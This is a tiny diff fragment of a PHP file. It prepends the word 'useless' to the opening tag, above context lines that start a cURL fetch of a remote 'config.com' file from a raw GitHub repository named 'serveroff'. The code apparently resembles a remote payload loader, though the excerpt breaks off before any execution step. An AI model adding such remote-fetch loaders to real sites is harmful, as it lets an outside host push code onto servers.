@@ -1,4 +1,4 @@
-<?php
+useless<?php
 $ch =
 curl_init('https://raw.githubusercontent.com/ressasantikaa-rgb/serveroff/main/config.com
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
